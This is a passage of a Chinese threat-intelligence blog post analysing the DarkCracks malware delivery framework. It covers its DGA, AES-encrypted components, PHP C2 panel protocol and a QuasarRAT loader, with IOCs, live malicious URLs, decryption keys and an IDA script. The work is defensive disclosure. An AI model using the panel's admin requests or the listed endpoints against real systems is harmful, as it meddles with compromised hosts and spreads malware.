<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_emurl.png" alt="smartupdate_emurl" loading="lazy"></p>
<p>sudoku1项目于2023年7月11日17:08:29创建，17:24:02提交第一条包含seed_string的记录，目前有6条提交记录。</p>
<table>
<thead>
<tr>
<th>Commit</th>
<th>Date</th>
<th>authHeader</th>
</tr>
</thead>
<tbody>
<tr>
<td>e1e10dc</td>
<td>2024.03.28</td>
<td>LJHRQWE</td>
</tr>
<tr>
<td>abb67fc</td>
<td>2024.03.13</td>
<td>LJHRQWE</td>
</tr>
<tr>
<td>6392b06</td>
<td>2023.12.27</td>
<td>LJHRQWE</td>
</tr>
<tr>
<td>c72963b</td>
<td>2023.10.04</td>
<td>SLDJKFA</td>
</tr>
<tr>
<td>248c8a8</td>
<td>2023.10.04</td>
<td>Linux Max</td>
</tr>
<tr>
<td>5970967</td>
<td>2023.07.11</td>
<td>Rbz021g6</td>
</tr>
</tbody>
</table>
<p>我们使用"git diff"核对了所有的提交记录，发现变化集中在main.cpp中的seed_string变量，从中提取了6个不同的clienturl和C2url（详情见IOC中的github小节）。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_git.png" alt="smartupdate_git" loading="lazy"></p>
<p>而配置文件j8UgL3v中的emurl <code>https://pastebin[.]com/raw/GYEBVyMR</code>， 除了上述seed_string之外（详情见IOC中的pastebin小节），还给我们带来另一个视野：访问该页面的IP统计。目前Unique访问该页面的IP数字接近300。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_ips.png" alt="smartupdate_ips.png" loading="lazy"></p>
<h3 id="0x02-dgaurl">0x02: DGAUrl</h3>
<p>dgaurl与emurl的处理逻辑是一样的，那它们有什么不同呢？答案是来源，emurl来源于配置文件，而dagurl是通过算法生成。算法逻辑比较简单，每月生成一个域名，将当前”年&amp;月“按照“%d%02d”进行格式化，然后使用上文所述的字串加密算法进行加密，最后和”http://%s.com“进行拼接，得到dgaurl。以”202408“为例，产生的dga域名为<code>UVDFUgOAgjL.com</code>。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_dga.png" alt="smartupdate_dga" loading="lazy"></p>
<p>我们核对了2023年至今dgaurl（详情见IOC中的DGA小节），发现所有域名均为未注册状态。这在某种意义上说明Darkcracks潜伏的非常好，emurl机制并没有被安全社区没有被发现，在这种情况之下，他们甚至觉得没有必要启用最终应急手段。</p>
<h3 id="%E8%A7%A3%E5%AF%86%E6%89%A7%E8%A1%8Cclient">解密执行Client</h3>
<p>Client使用AES CBC模式加密，解密所需的秘钥&amp;IV由配置文件中的key提供。key是一个hexstring，前16字节为秘钥，后16字节为IV。目前捕获的俩个配置文件中的key均为<code>2D8C7FEE42D3DB4A8E55FBFF65351E1BB8ADDBA8FCBD0F85EE1CA5033D0DF342</code>。</p>
<p>它对应的秘钥与IV如下示，</p>
<ul>
<li>AES KEY: 2D 8C 7F EE 42 D3 DB 4A 8E 55 FB FF 65 35 1E 1B</li>
<li>AES IV: B8 AD DB A8 FC BD 0F 85 EE 1C A5 03 3D 0D F3 42</li>
</ul>
<p>Runner在成功解密Client之后，将其保存在/tmp目录，通过execl函数启动执行，并将自身删除。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_launch.png" alt="smartupdate_launch" loading="lazy"></p>
<h2 id="part3-client%E5%88%86%E6%9E%90">Part3: Client分析</h2>
<p>关于Client，我们以<code>se3hf6jwc-x64</code>做为主要分析对象，以下为它解密前后的基本信息（感兴趣的读者可以使用附录中的CyberChef脚本对Client进行解密）</p>
<pre><code>Name:se3hf6jwc-x64
MD5:81eccc9c10368aa54cfed371f83da45a
MD5:fe5f484f71bf0fd7afa56e60da7eec6f (Decrypted)
Magic:ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, stripped
</code></pre>
<p>经过分析，我们确认Client使用了和Runner类似的架构，即“配置文件驱动+3层Url任务轮询”。与Runner的主要轮询目标为clientUrl不同的是，Client的的目标是配置文件中url字段指定的C2上报入口。Client将本身的敏感设备信息加密后上报给C2，被C2下发的加密配置驱动执行不同的任务。</p>
<ul>
<li>NewVersion：下载更新Runner，Client</li>
<li>NewLauncherVersion：下载更新Launcher</li>
<li>versionCheckerUrl：更新C2上报入口</li>
</ul>
<h3 id="c2%E9%80%9A%E4%BF%A1">C2通信</h3>
<p>Client通过以下代码片段构建JSON格式上线信息，加密后做为http的body上报给C2，支持http/https俩种方式。值的一提的是platform字段，它的值的格式为"arch/user(euid)/version"，version通过/proc/version获得。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_beacon.png" alt="smartupdate_beacon" loading="lazy"></p>
<p>以实际捕获的流量为例，可以看出交互流量中的body部分都是加密的。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_packet.png" alt="smartupdate_packet" loading="lazy"></p>
<p>C2的回包解密后如下所示，Client收到此消息，根据versionCheckerUrl字段的值，更新C2，再次开始请求新的配置文件。</p>
<pre><code>{
"versionCheckerUrl":"https:\\/\\/www.miracles.com.hk\\/wp-content\\/plugins\\/foxiplugin\\/detail.php",
"authHeader":"Linux MaEW"
}
</code></pre>
<h3 id="launcher%E7%BB%84%E4%BB%B6%E7%9A%84%E6%8E%A8%E6%B5%8B">Launcher组件的推测</h3>
<p>目前，我们没有捕获Launcher组件，但根据Client对NewLauncherVersion的处理，可以推测出以下Launcher情报：</p>
<ol>
<li>Launcher被加密存放在远程服务器上，使用的加密算法为AES</li>
<li>Launcher也支持和Runner,Client一样的加密算法</li>
<li>Launcher同样是被配置文件驱动，核心配置保存在<code>/var/tmp/.shm/9d8dadaf-6c7e-4975-b26d-ec17e67493c6</code></li>
</ol>
<h3 id="client%E7%9A%84%E6%BC%94%E5%8C%96">Client的演化</h3>
<p>我们对比了2.0，2.01的Client样本，样本层面的变化体现在敏感字串是否加密，以及是否支持DGA算法，可以看着这些变化的主要目的是为了增强隐蔽性&amp;健壮性。</p>
<table>
<thead>
<tr>
<th>Version</th>
<th>Encrypted String</th>
<th>DGA</th>
</tr>
</thead>
<tbody>
<tr>
<td>SUC 2.0</td>
<td>N (x86/x64 Y)</td>
<td>N (x86/x64 Y)</td>
</tr>
<tr>
<td>SUC 2.01</td>
<td>Y</td>
<td>Y</td>
</tr>
</tbody>
</table>
<p>有意思的一个点是，其实在SUC2.0中x86/64架构的Client其实已经支持<strong>敏感字串加密以及DGA特性</strong>。可以看出Darkcracks对于功能升级比较谨慎，先从部分架构试运行，待功能完善&amp;稳定之后再推行到所有架构。<br>
<img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_client.png" alt="smartupdate_client.png" loading="lazy"></p>
<h2 id="part4-c2-panel%E5%88%86%E6%9E%90">Part4: C2 Panel分析</h2>
<p>某个被感染的用户向我们提供了其设备上C2 Panel文件，它的基本信息如下所示：</p>
<pre><code>MD5: 8103a187a710378020dbdee8ff213b5b
MD5: 69ef27f8e69dbba222c3c33a53906d79 (Deobfuscate)
Obfucation: Yes
</code></pre>
<p>该文件采用了多层混淆，只需要逐层将eval替换为print，即可去混淆。<br>
<img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_code.png" alt="smartupdate_code.png" loading="lazy"></p>
<p>C2 Panel由PHP语言实现，代码在600行左右，功能比较简单，概括来说就是根据硬编码的配置文件<code>tem9FG5.tmp</code>对不同来源的请求做出回应，支持业务，管理俩种模式。先说管理模式，即请求来源于Bot Master，C2 Pannel根据请求报文对配置文件进行“增，删，改，查”；而业务模式，说有是当请求来源于Bot时，根据配置文件的设定，决定是否记录Bot，是否响应Bot。</p>
<p>如何区分请求来源呢？答案是authentication字段，当其值是Statistics暗示来源为Bot Master；否则就是来自于Bot。authentication字段的另一个作用是验证是否来自合法的Bot，其实每个C2在初始时会设定一个特定的authHeader，只有当Bot的auchenticaion和C2的authHeader匹配时，C2才会进行响应。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_condition.png" alt="smartupdate_condition" loading="lazy"></p>
<p>某种意义上来说，配置文件tem9FG5.tmp相关于一个数据库，它记录着Bot Master的设置，它保存着Bot的信息，那它的格式是什么的，支持哪些字段？首选我们需要生成一个配置文件，方法是向测试机器发送了以下2个请求，模拟初始化和Bot上线。</p>
<ol>
<li>初化始配置文件，设定authHeader</li>
</ol>
<pre><code>{"authentication":"Statistics","isActive":true,"authHeader":"XLab"}
</code></pre>
<ol start="2">
<li>Bot上线</li>
</ol>
<pre><code>{"authentication":"XLab","uuid":"fac60bdc-5786-415e-8992-79abcb132d64","platform":"x64 / root(0) / Linux","interval":8867000,"version":"SUC 2.01","launcherVersion":""}
</code></pre>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_test.png" alt="smartupdate_test" loading="lazy"></p>
<p>测试机器上的C2 Panel对于以上请求生成的加密配置文件如下所示：</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_testconfig.png" alt="smartupdate_testconfig" loading="lazy"></p>
<p>配置文件的解密比较简单，可需使用<code>strrev(convert_uudecode($input))</code>即可解密，解密后的明文和我们构造的请求能够一一对应的，可以配置文件为JSON格式，Bot的相关信息被存放在clients字段，authHeader被存放在config字段。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_config.png" alt="smartupdate_config" loading="lazy"></p>
<p>以下为配置支持的字段以及它们的含义。</p>
<table>
<thead>
<tr>
<th>Item</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>config</td>
<td>C2 Status</td>
</tr>
<tr>
<td>clients</td>
<td>Bot info</td>
</tr>
<tr>
<td>pendingChanges</td>
<td>Config to be delivered</td>
</tr>
<tr>
<td>sessions</td>
<td>Cmd output from bot</td>
</tr>
<tr>
<td>sessionCommands</td>
<td>Cmds to be delivered</td>
</tr>
</tbody>
</table>
<p>Bot Master通过pendingChanges，sessionCommands俩个字段向Bot投递指令。下面的代码片段正是C2核对client的uuid，决定是否下发Launcher配置。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/09/smartupdate_pending.png" alt="smartupdate_pending.png" loading="lazy"></p>
<p>受害者向我们提供的配置文件中的pendingChanges涉及到一个被黑的站点<code>soussanart.com</code>，我们向其发送查询客户端请求，获得了76个client的信息，它们分布在17个国家，涉及到4个不同的版本，跨度很大从1.2到2.02。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_json.png" alt="smartupdate_json" loading="lazy"></p>
<p>至此，我们对DarkCracks的分析告一段落。很显然还有许多谜题待解开，我们相信这仅仅是一个开始。</p>
<h2 id="part5-%E6%96%B0%E9%A1%B9%E7%9B%AEftmqpwsmnb%E5%88%86%E6%9E%90">Part5: 新项目ftMQPwsMnB分析</h2>
<p>2024年8月23日，当我们完成本文大部分内容，正欲收笔之时，突然发现adrhpbrn29创建了一个新项目ftMQPwsMnB，该项目只有一个名为bzupdater.zip的压缩包，包含<code>config.ini,Updater.exe,version.dll</code>3个文件。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_newgit.png" alt="smartupdate_newgit" loading="lazy"></p>
<p>快速分析之后，我们确认version.dll是恶意的，它的功能是使用AES算法对Binary资源进行解密得到Shellcode，Shellcode最终加载的Payload是开源的远控木马QuasarRAT。AES KEY为<code>FCFF50FB13B09C44F806CF4947381718</code>，IV为<code>2DD695D6845AA9F83F0071B709D78CBD</code>。除AES之外，还使用了XOR对字串解密，XOR的key为<code>quackquack</code>。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_newaes.png" alt="smartupdate_newaes" loading="lazy"></p>
<p>目前ftMQPwsMnB项目共有5次提交记录，虽然version.dll的md5各个不同，但作为核心的的“Binary”其实只有3个。</p>
<table>
<thead>
<tr>
<th>Commit</th>
<th>Md5 of Version</th>
<th>Md5 of "Binary"</th>
</tr>
</thead>
<tbody>
<tr>
<td>7ddc62e</td>
<td>456d05566fc3391e195a5f9cb346c92c</td>
<td>91bcbf4de7ff8bddebdc49b62cad1ac1</td>
</tr>
<tr>
<td>ab75b85</td>
<td>c2d69f5e5fa2af8131f1cb3d9fdfbd4b</td>
<td>05481286a1aa1f0d7d9df7bbbb3aeb73</td>
</tr>
<tr>
<td>ab6a892</td>
<td>9e94126e8a26efd10b2a5b179d64be90</td>
<td>05481286a1aa1f0d7d9df7bbbb3aeb73</td>
</tr>
<tr>
<td>271b28c</td>
<td>ceb7f3d92096892410e041a3b318ab9b</td>
<td>05481286a1aa1f0d7d9df7bbbb3aeb73</td>
</tr>
<tr>
<td>653eb26</td>
<td>ca93591a9441a2ade70821f67292d982</td>
<td>6176c8374cd656783c9b354944c8052e</td>
</tr>
</tbody>
</table>
<p>关于远控木马QuasarRAT，网络上已有非常多的分析文章，感兴趣的读者可自行参阅，本文不再赘述。本案列中3个Shellcode所投递的QuasarRAT的配置信息几乎是一样的，只是在C2部分端口有所不同，以<code>ab75b85</code>投递的QuasarRAT为例，它的配置文件如下所示：</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_ratjson.png" alt="smartupdate_ratjson" loading="lazy"></p>
<p>目前我们还没有发现这个项目的使用场景，但config.ini的内容与收费软件<a href="https://www.bandisoft.com/?ref=blog.xlab.qianxin.com">bandisoft</a>相关，因此我们推测其中的一个传播手段或许是通过免费破解诱骗用户下载安装。</p>
<p><img src="https://blog.xlab.qianxin.com/content/images/2024/08/smartupdate_bandfee.png" alt="smartupdate_bandfee.png" loading="lazy"></p>
<p>8月26日，该项目又新增2个提交记录，增加一个PDF文件，初始文名分别是resume，该文件受密码保护，因此我们暂时不知道内容为何。大约在50分钟之后，它被重命名为韩文<code>김영미 이력서</code>，即Kim Young-mi's resume。resume是常见的钓鱼诱饵文件，我们推测DarkCracks的攻击目标之一是韩语用户群体。</p>
<table>
<thead>
<tr>
<th>Date</th>
<th>Commit</th>
<th>Filename</th>
<th>MD5</th>
</tr>
</thead>
<tbody>
<tr>
<td>2024/08/26 09:19:32</td>
<td>5130de3</td>
<td>resume.pdf</td>
<td>71ebe71eec7e0f2420cd931534dd22c3</td>
</tr>
<tr>
<td>2024/08/26 10:09:27</td>
<td>a04bf51</td>
<td>김영미 이력서.pdf</td>
<td>71ebe71eec7e0f2420cd931534dd22c3</td>
</tr>
</tbody>
</table>
<h1 id="%E6%80%BB%E7%BB%93">总结</h1>
<p>DarkCracks是一个设计简洁但灵活的payload投递与升级框架，其优点非常突出。例如，三层URL轮询机制为框架提供了强大的健壮性；多组件加密投递和组件运行后即删的特性，有效保护了核心功能模块不被发现。然而，它也存在明显的不足之处，例如在通过DGAUrl投递备用配置时，仅依赖可逆算法进行保护，使得整个网络存在被接管的风险；C2 Panel的管理模式很容易获得，了解协议的人能很轻松的修改甚至清空配置文件，进而让C2停止工作，使得网络存在瘫痪的可能。</p>
<p>我们建议网络管理员通过上文所述与<code>/var/tmp/.shm</code>相关技术细节判断感染与否，欢迎受害者与我们联系，我们可以提供技术支持。</p>
<p>这是我们目前掌握的关于DarkCracks所有情报。当然本文的分析只是从我们自身的视野出发，肯定有其局限性，欢迎具有独特视角的同行企业提供新的线索，以帮助进一步完善DarkCracks的画像。如果您对我们的研究感兴趣，亦可通过<a href="https://x.com/Xlab_qax?ref=blog.xlab.qianxin.com">X平台</a>与我们联系，获取更多详细信息。</p>
<h1 id="ioc">IOC</h1>
<h2 id="md5">MD5</h2>
<pre><code>Runner
c30e9934299fd43527834086b6cfa26a *pQ1iM9hd-armv5-uclibc
8c53e98685fc3ce8b86055991b905926 *pQ1iM9hd-armv6-gnu
257c9ec1241b3fa59565edec9689276b *pQ1iM9hd-armv8-gnu
281e4ede8ffc0f854ce671b5b3ae06f8 *pQ1iM9hd-mips-uclibc
21732589b41506e1e7de87d7066ea43e *pQ1iM9hd-mipsel-uclibc
93a7cba1edbacb633021ebc38c10a79f *pQ1iM9hd-x64
036d6c73fe7a568160f3de8a98d0a58b *pQ1iM9hd-x64-musl
5340ee724893fd596852f22ecbc3e795 *pQ1iM9hd-x86

c6909b8b8bc55fac85c5fe650c7df42a *wk8dnj2k-armv5-uclibc
227d19736af70bef817da96668994af8 *wk8dnj2k-armv6-gnu
a18957196842c78cbce2247d766712ad *wk8dnj2k-armv8-gnu
0dd9e350aafe0d1c9e619d27ebd2ccfd *wk8dnj2k-mips-uclibc
8859d9b1c3f41b9dad3cee68adaddd92 *wk8dnj2k-mipsel-uclibc
93a7cba1edbacb633021ebc38c10a79f *wk8dnj2k-x64
e587cd53059f58526be7e2167cf7177b *wk8dnj2k-x64-musl
5340ee724893fd596852f22ecbc3e795 *wk8dnj2k-x86

Client

af93dc3d635ed3b46439e38fae8ecf6b *mY5bJK7e-armv5-uclibc
b0f7df80d2adda176f8d58a55b773eed *mY5bJK7e-armv5-uclibc.decrypted
7d6ea278b5ae9081c03e340d6f98a4a5 *mY5bJK7e-armv6-gnu
635a7ae54cb7966d61e2e8f64391e870 *mY5bJK7e-armv6-gnu.decrypted
c1d07c102e436284d3fbce0410658ae8 *mY5bJK7e-armv8-gnu
11d4db491fe82e37ff0a5c3787cfa143 *mY5bJK7e-armv8-gnu.decrypted
4e64816a821ce2eb231a5be5395a2f20 *mY5bJK7e-mips-uclibc
2e7d67a3be72c5d1718fc2689c0d5d08 *mY5bJK7e-mips-uclibc.decrypted
5e9bf8a980bcc4d004ff505778b843e6 *mY5bJK7e-mipsel-uclibc
527cc24f043c58101c122c2a2f6c6d8e *mY5bJK7e-mipsel-uclibc.decrypted
5b39497af0d9874d38288476d3a9f5a4 *mY5bJK7e-x64
dffee792a8e65d38d897bd3400aecd3d *mY5bJK7e-x64.decrypted
7515282b084374d9d8b87e46b87e4af8 *mY5bJK7e-x64-musl
ee0d3c3c528034fa3ebdc37596014382 *mY5bJK7e-x64-musl.decrypted
d41c379725973e97ef9cbafb1efdb2f3 *mY5bJK7e-x86
1d407ff91ce19afc82f7946c3ec24dea *mY5bJK7e-x86.decrypted


a1f3e574799c3f874a8d3563dbc55f4c *se3hf6jwc-armv5-uclibc
ad831d9c00c90fead925f4575f4a6a9a *se3hf6jwc-armv5-uclibc.decrypted
2b5df28714421d79ab3e63eac538d853 *se3hf6jwc-armv6-gnu
2107625e9980d190e3214ef09a83608f *se3hf6jwc-armv6-gnu.decrypted
35f846e24d0cccb5a3ec736c07f6a0a2 *se3hf6jwc-armv8-gnu
5fbe460fc8fa09dc6adc73e5e908cd0e *se3hf6jwc-armv8-gnu.decrypted
27f18a27942fbb71c4e84736db45b5cf *se3hf6jwc-mips-uclibc
e1674821a190f5250e6aba40916c9061 *se3hf6jwc-mips-uclibc.decrypted
b1040f3193d4bec01b13bc73ecaa2587 *se3hf6jwc-mipsel-uclibc
7c33c052c5d451ba4069639286dfc4b5 *se3hf6jwc-mipsel-uclibc.decrypted
81eccc9c10368aa54cfed371f83da45a *se3hf6jwc-x64
fe5f484f71bf0fd7afa56e60da7eec6f *se3hf6jwc-x64.decrypted
08169e20daaad052075bd4026c8e287f *se3hf6jwc-x64-musl
2caf09452e79390f09bebf27dad9acf4 *se3hf6jwc-x64-musl.decrypted
5421bc92f2dd8f37538c2023c1e2f8ee *se3hf6jwc-x86
7168f47f067d260c34543e32a7a55cbd *se3hf6jwc-x86.decrypted


Config
4e52426a96baf84431775adf2d6f0ae2 *j8UgL3v
4a642a86a8d8e71e5f163fa54eda9241 *qoakeifm-unknown.txt

</code></pre>
<h2 id="downloader">Downloader</h2>
<pre><code>https://www.auntyaliceschool.site/wp-admin/maint/{se3hf6jwc|wk8dnj2k}
http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/{mY5bJK7e|pQ1iM9hd}
http://45.169.87.67/vendor/sabre/event/lib/Promise/{se3hf6jwc|wk8dnj2k}
</code></pre>
<h2 id="c2-victims">C2 (Victims)</h2>
<pre><code>http://187.190.1.137/vendor/guzzlehttp/guzzle/src/Exception/detail.php
http://204.199.192.44/vendor/paragonie/sodium_compat/src/Core32/Poly25519.php
http://148.102.51.6/vendor/guzzlehttp/guzzle/src/Handler/CurlSingleHandler.php
http://158.177.2.191/vendor/guzzlehttp/guzzle/src/Handler/CurlSingleHandler.php
http://64.227.0.146/vendor/guzzlehttp/guzzle/src/Handler/CurlSingleHandler.php
http://216.238.103.62:8013/vendor/guzzlehttp/guzzle/src/Exception/DNSException.php
http://52.0.85.62/vendor/guzzlehttp/guzzle/src/Exception/detail.php
https://www.miracles.com.hk/wp-content/plugins/foxiplugin/detail.php
http://152.67.11.54/wordpress//wp-admin/includes/sus.php


</code></pre>
<h2 id="dga-c2">DGA C2</h2>
<h3 id="202301-202312">202301-202312</h3>
<pre><code>
kTD7YgOAgjL.com
gTD7YgOAgjL.com
sTD7YgOAgjL.com
EVD7YgOAgjL.com
AVD7YgOAgjL.com
MVD7YgOAgjL.com
IVD7YgOAgjL.com
UVD7YgOAgjL.com
QVD7YgOAgjL.com
YTC7YgOAgjL.com
kTC7YgOAgjL.com
gTC7YgOAgjL.com

</code></pre>
<h3 id="202401202408">202401- 202408</h3>
<pre><code>
kTDFUgOAgjL.com
gTDFUgOAgjL.com
sTDFUgOAgjL.com
EVDFUgOAgjL.com
AVDFUgOAgjL.com
MVDFUgOAgjL.com
IVDFUgOAgjL.com
UVDFUgOAgjL.com

</code></pre>
<h2 id="c2">C2</h2>
<pre><code>
216.74.123.97	United States|California|Los Angeles	AS834|IPXO LLC
213.139.233.163	Japan|Osaka|Osaka	AS34985|ASN block not managed by the RIPE NCC

</code></pre>
<h2 id="configs">Configs</h2>
<h3 id="github">Github</h3>
<pre><code>Address: https://github[.]com/adrhpbrn29/sudoku1

{"url":"http://148.102.51.6/vendor/guzzlehttp/guzzle/src/Handler/CurlSingleHandler.php","authHeader":"LJHRQWE","clientUrl":"http://45.169.87.67/vendor/sabre/event/lib/Promise/se3hf6jwc","runnerUrl":"http://45.169.87.67/vendor/sabre/event/lib/Promise/wk8dnj2k"}

{"url":"http://148.102.51.6/vendor/guzzlehttp/guzzle/src/Handler/CurlSingleHandler.php","authHeader":"LJHRQWE","clientUrl":"https://www.auntyaliceschool.site/wp-admin/maint/se3hf6jwc","runnerUrl":"https://www.auntyaliceschool.site/wp-admin/maint/wk8dnj2k"}

{"url":"http://148.102.51.6/vendor/guzzlehttp/guzzle/src/Handler/CurlSingleHandler.php","authHeader":"LJHRQWE"}

{"url":"http://158.177.2.191/vendor/guzzlehttp/guzzle/src/Handler/CurlSingleHandler.php","authHeader":"SLDJKFA"}

{"url":"http://64.227.0.146/vendor/guzzlehttp/guzzle/src/Handler/CurlSingleHandler.php","authHeader":"Linux Max"}'

{"url":"http://216.238.103.62:8013/vendor/guzzlehttp/guzzle/src/Exception/DNSException.php","authHeader":"Rbz021g6"}


</code></pre>
<h3 id="pastebin">Pastebin</h3>
<pre><code>Address:https://pastebin[.]com/GYEBVyMR

{"url":"http://52.0.85.62/vendor/guzzlehttp/guzzle/src/Exception/detail.php","authHeader":"GGSEDPHP","clientUrl":"http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/mY5bJK7e","runnerUrl":"http://179.191.68.85:82/vendor/sebastian/diff/src/Exception/pQ1iM9hd"}
</code></pre>
<h2 id="appendix">Appendix</h2>
<h3 id="ida-script">IDA Script</h3>
<pre><code># Install flare_emu first
# Only test with  93a7cba1edbacb633021ebc38c10a79f
# Modify 'decstr_addr' in in your case

import flare_emu
import base64
import string


def decode(cipher):
    tmp = cipher[::-1] + b"=" * ((4 - len(cipher) % 4) )
    out = bytearray()
    for i, v in enumerate(base64.urlsafe_b64decode(tmp)):
        cha = v ^ key[i % len(key)]
        if chr(cha) in string.ascii_letters:
            cha ^= 0x20
        out.append(cha)
    out += b"=" * ((4 - len(out) % 4) % 4)
    return base64.urlsafe_b64decode(out)

def iterateCallback(eh, address, argv, userData):
    ro=ida_segment.get_segm_by_name(".rodata")

    if ro.start_ea &lt;= argv[0] &lt;=ro.end_ea:

        buff=eh.getEmuString(argv[0])
        if len(buff)&gt;0:
            
            
            plain=decode(buff)
            print(hex(argv[0]),buff,"&lt;==============&gt;",plain)
            ida_bytes.put_bytes(argv[0],b'\x00'*len(buff))
            ida_bytes.put_bytes(argv[0],plain)
            

decstr_addr=0x0000FCD0
key=bytes.fromhex('43 72 61 63 6B 61 6C 61 63 6B 69 6E 27')           
eh=flare_emu.EmuHelper()            
eh.iterate(decstr_addr,iterateCallback)


</code></pre>
<h3 id="cyberchef">CyberChef</h3>
<pre><code>https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'2D%208C%207F%20EE%2042%20D3%20DB%204A%208E%2055%20FB%20FF%2065%2035%201E%201B'%7D,%7B'option':'Hex','string':'B8%20AD%20DB%20A8%20FC%20BD%200F%2085%20EE%201C%20A5%2003%203D%200D%20F3%2042'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)
</code></pre>

    </section>

    <section class="article-comments gh-canvas">
        <div id="disqus_thread"></div>
        <script>
            var disqus_config = function () {
                this.page.url = "https://blog.xlab.qianxin.com/uncovering_darkcracks_payload_delivery_framework_cn/";  
                this.page.identifier = "ghost-669f9a1da846010001f6ec10"
            };
            (function() {
            var d = document, s = d.createElement('script');
            s.src = 'https://xlab-qax.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </section>
</article>
</main>





    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://blog.xlab.qianxin.com">奇安信 X 实验室</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                <ul class="nav">
    <li class="nav-rss"><a href="https://blog.xlab.qianxin.com/rss/">RSS</a></li>
</ul>

            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=256e1729b4"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.min.js"></script>

<script>
    tocbot.init({
        // Where to render the table of contents.
        collapseDepth: 6,
        tocSelector: '.gh-toc',
        // Where to grab the headings to build the table of contents.
        contentSelector: '.gh-content',
        // Which headings to grab inside of the contentSelector element.
        headingSelector: 'h1, h2, h3',
        // Ensure correct positioning
        hasInnerContainers: true,
    });

    document.addEventListener('DOMContentLoaded', function() {
        // 获取所有包含srcset属性的元素
        var elementsWithSrcset = document.querySelectorAll('[srcset]');

        // 循环遍历每个元素并删除srcset属性
        elementsWithSrcset.forEach(function(element) {
            element.removeAttribute('srcset');
        });
    });
</script>



</body>
</html>
